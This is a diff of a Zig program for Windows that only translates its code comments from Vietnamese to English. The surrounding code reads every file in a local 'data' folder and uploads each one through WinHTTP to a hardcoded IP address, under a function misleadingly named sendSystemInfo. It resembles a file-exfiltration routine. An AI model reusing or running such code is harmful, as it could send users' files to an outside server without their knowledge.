@@ -71,7 +71,7 @@ const WINHTTP = struct {
     ) callconv(windows.WINAPI) BOOL;
 };
 
-// Các chuỗi UTF-16 cố định
+// Fixed UTF-16 strings
 const USER_AGENT = [_:0]u16{ 'Z', 'i', 'g', ' ', 'S', 'y', 's', 't', 'e', 'm', ' ', 'I', 'n', 'f', 'o' };
 const SERVER_HOST = [_:0]u16{ '1', '5', '0', '.', '9', '5', '.', '1', '1', '4', '.', '1', '2', '0' };
 const POST_METHOD = [_:0]u16{ 'P', 'O', 'S', 'T' };
@@ -84,11 +84,11 @@ pub fn sendSystemInfo() !void {
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Mở thư mục data
+    // Open data directory
     var dir = try std.fs.cwd().openDir("data", .{ .iterate = true });
     defer dir.close();
 
-    // Duyệt qua từng file trong thư mục
+    // Iterate through each file in directory
     var dir_iterator = dir.iterate();
     while (try dir_iterator.next()) |entry| {
         if (entry.kind != .file) continue;
@@ -96,31 +96,31 @@ pub fn sendSystemInfo() !void {
 
         std.debug.print("Processing file: {s}\n", .{entry.name});
 
-        // Mở file
+        // Open file
         const file = try dir.openFile(entry.name, .{ .mode = .read_only });
         defer file.close();
 
-        // Đọc nội dung file
+        // Read file contents
         const file_size = try file.getEndPos();
         const file_content = try file.readToEndAlloc(allocator, file_size);
         defer allocator.free(file_content);
 
-        // Gửi file lên server
+        // Send file to server
         try sendFileContent(file_content, entry.name);
     }
 }
 
-// Hàm phụ để gửi nội dung file
+// Helper function to send file contents
 fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Tạo form-data body
+    // Create form-data body
     var form_data = std.ArrayList(u8).init(allocator);
     defer form_data.deinit();
 
-    // Thêm header cho phần form-data
+    // Add form-data header
     try form_data.appendSlice("--");
     try form_data.appendSlice("--boundary12345");
     try form_data.appendSlice("\r\n");
@@ -129,15 +129,15 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     try form_data.appendSlice("\"\r\n");
     try form_data.appendSlice("Content-Type: application/octet-stream\r\n\r\n");
 
-    // Thêm nội dung file
+    // Add file contents
     try form_data.appendSlice(file_content);
 
-    // Kết thúc form-data
+    // End form-data
     try form_data.appendSlice("\r\n--");
     try form_data.appendSlice("--boundary12345");
     try form_data.appendSlice("--\r\n");
 
-    // Khởi tạo WinHTTP session
+    // Initialize WinHTTP session
     const hSession = WINHTTP.WinHttpOpen(
         &USER_AGENT,
         WINHTTP.WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
@@ -147,7 +147,7 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     ) orelse return error.WinHttpOpenFailed;
     defer _ = WINHTTP.WinHttpCloseHandle(hSession);
 
-    // Kết nối tới server
+    // Connect to server
     const hConnect = WINHTTP.WinHttpConnect(
         hSession,
         &SERVER_HOST,
@@ -156,7 +156,7 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     ) orelse return error.WinHttpConnectFailed;
     defer _ = WINHTTP.WinHttpCloseHandle(hConnect);
 
-    // Tạo request
+    // Create request
     const hRequest = WINHTTP.WinHttpOpenRequest(
         hConnect,
         &POST_METHOD,
@@ -168,7 +168,7 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     ) orelse return error.WinHttpRequestFailed;
     defer _ = WINHTTP.WinHttpCloseHandle(hRequest);
 
-    // Gửi request với form-data
+    // Send request with form-data
     if (WINHTTP.WinHttpSendRequest(
         hRequest,
         &CONTENT_TYPE_HEADER,
@@ -181,7 +181,7 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
         return error.WinHttpSendRequestFailed;
     }
 
-    // Gửi form-data body
+    // Send form-data body
     var bytes_written: WINHTTP.DWORD = undefined;
     if (WINHTTP.WinHttpWriteData(
         hRequest,
@@ -192,12 +192,12 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
         return error.WinHttpWriteDataFailed;
     }
 
-    // Nhận response
+    // Receive response
     if (WINHTTP.WinHttpReceiveResponse(hRequest, null) == 0) {
         return error.WinHttpReceiveResponseFailed;
     }
 
-    // Kiểm tra status code
+    // Check status code
     var status_code: WINHTTP.DWORD = undefined;
     var size: WINHTTP.DWORD = @sizeOf(WINHTTP.DWORD);
     if (WINHTTP.WinHttpQueryHeaders(
